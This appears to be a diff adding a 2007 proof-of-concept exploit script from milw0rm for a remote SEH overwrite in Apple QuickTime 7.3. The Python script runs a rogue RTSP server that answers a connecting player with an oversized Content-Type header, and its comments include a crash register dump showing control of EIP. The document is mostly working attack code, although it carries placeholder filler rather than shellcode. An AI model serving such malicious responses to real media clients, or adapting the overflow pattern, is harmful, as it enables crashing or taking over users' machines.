@@ -1,0 +1,75 @@
+#!/usr/bin/python
+# Apple QuickTime 7.3 RTSP Response 0day Remote SEH Overwrite PoC Exploit
+# Bug discovered by Krystian Kloskowski (h07) <h07@interia.pl>
+# Tested on: Apple QuickTime Player 7.3 / XP SP2 Polish
+# Details:..
+#
+# (RTSP) Content-Type: [A * 995] + [B * 4096]\r\n
+#
+# 0x41414141  Pointer to next SEH record
+# 0x42424242  SE handler
+#
+# ----------------------------------------------------------------
+# Exception C0000005 (ACCESS_VIOLATION reading [42424242])
+# ----------------------------------------------------------------
+# EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+# EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+# ECX=42424242: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+# EDX=7C9037D8: 8B 4C 24 04 F7 41 04 06-00 00 00 B8 01 00 00 00
+# ESP=0012F8A8: BF 37 90 7C 90 F9 12 00-F8 F0 13 00 AC F9 12 00
+# EBP=0012F8C8: 78 F9 12 00 8B 37 90 7C-90 F9 12 00 F8 F0 13 00
+# ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+# EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+# EIP=42424242: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+#               --> N/A
+# ----------------------------------------------------------------
+##
+
+from socket import *
+
+header = (
+'RTSP/1.0 200 OK\r\n'
+'CSeq: 1\r\n'
+'Date: 0x00 :P\r\n'
+'Content-Base: rtsp://0.0.0.0/1.mp3/\r\n'
+'Content-Type: %s\r\n' # <-- overflow
+'Content-Length: %d\r\n'
+'\r\n')
+
+body = (
+'v=0\r\n'
+'o=- 16689332712 1 IN IP4 0.0.0.0\r\n'
+'s=MPEG-1 or 2 Audio, streamed by the PoC Exploit o.O\r\n'
+'i=1.mp3\r\n'
+'t=0 0\r\n'
+'a=tool:ciamciaramcia\r\n'
+'a=type:broadcast\r\n'
+'a=control:*\r\n'
+'a=range:npt=0-213.077\r\n'
+'a=x-qt-text-nam:MPEG-1 or 2 Audio, streamed by the PoC Exploit o.O\r\n'
+'a=x-qt-text-inf:1.mp3\r\n'
+'m=audio 0 RTP/AVP 14\r\n'
+'c=IN IP4 0.0.0.0\r\n'
+'a=control:track1\r\n'
+)
+
+tmp = "A" * 995
+tmp += "B" * 4096
+header %= (tmp, len(body))
+evil = header + body
+
+s = socket(AF_INET, SOCK_STREAM)
+s.bind(("0.0.0.0", 554))
+s.listen(1)
+print "[+] Listening on [RTSP] 554"
+c, addr = s.accept()
+print "[+] Connection accepted from: %s" % (addr[0])
+c.recv(1024)
+c.send(evil)
+raw_input("[+] Done, press enter to quit")
+c.close()
+s.close()
+
+# EoF
+
+# milw0rm.com [2007-11-23]
